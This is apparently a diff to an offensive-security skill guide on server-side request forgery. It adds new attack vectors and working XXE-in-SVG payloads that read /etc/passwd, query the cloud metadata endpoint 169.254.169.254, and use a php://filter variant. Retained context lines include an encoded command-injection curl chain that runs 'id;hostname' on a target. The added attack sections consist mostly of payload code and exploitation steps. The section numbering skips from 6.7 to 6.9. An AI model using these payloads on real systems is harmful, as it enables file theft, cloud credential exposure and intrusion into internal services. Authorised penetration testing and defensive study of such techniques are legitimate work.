@@ -21,7 +21,10 @@ This skill covers detection, confirmation, exploitation, filter bypass, and post
 - Any parameter named: `url`, `uri`, `src`, `dest`, `redirect`, `to`, `path`, `load`, `fetch`, `q`, `resource`, `target`, `host`, `api`, `endpoint`, `callback`, `dateserver`
 - `Referer` header that the server re-fetches
 - XML/SOAP `<import>`, `<include>`, `<load>` elements
+- **SVG upload with server-side rendering:** Any feature that accepts SVG files and converts them server-side (to PNG, thumbnail, preview) — the server parses the SVG XML, triggering XXE. External entity references (`file://`, `http://`) are resolved by the SVG renderer, enabling LFI and SSRF with the exfiltrated data rendered into the output image.
+- **Host header in OAuth callback construction:** If an OAuth integration endpoint uses the incoming `Host` header to build the callback URL before making a server-side request (e.g., `POST /-/jira/login/oauth/access_token`), setting `Host: internal.target.com:PORT` causes the server to send the OAuth token request to an internal address.
 - Any server error that includes an internal IP, internal hostname, or fetch-related stack trace
+- **Project/data import features:** When an app imports JSON/XML export files and processes model attributes, check if file attachment fields accept a remote URL instead of a file path. Any `remote_*_url` or equivalent "download from URL" attribute on an importable model triggers a server-side fetch on import.
 
 ---
 
@@ -197,7 +200,37 @@ ecmd=$(echo -n "id;hostname" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
 curl -s "http://TARGET/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
 ```
 
-### 6.7 Blind SSRF via PDF/HTML rendering (wkhtmltopdf)
+### 6.7 SSRF/LFI via SVG upload with server-side rendering
+
+Any feature that accepts SVG and converts it server-side (image resize, thumbnail, preview, emblem/badge generation) parses the SVG XML. If the renderer supports external entities, XXE triggers LFI and SSRF. The exfiltrated content renders visibly into the output image.
+
+**Payload — file read via XXE in SVG:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+```
+
+**Payload — SSRF via SVG:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+```
+
+Upload with `.svg` extension (or try `.svg` disguised as image if extension is filtered). The server renders the SVG to a PNG — if the entity resolved, the file/HTTP response content appears as text in the output image. Download the rendered image and read the text.
+
+**Also try:** `php://filter/convert.base64-encode/resource=/etc/passwd` as the SYSTEM path if the renderer runs PHP.
+
+### 6.9 Blind SSRF via PDF/HTML rendering (wkhtmltopdf)
 
 If the app generates PDFs with user-supplied HTML, try:
 
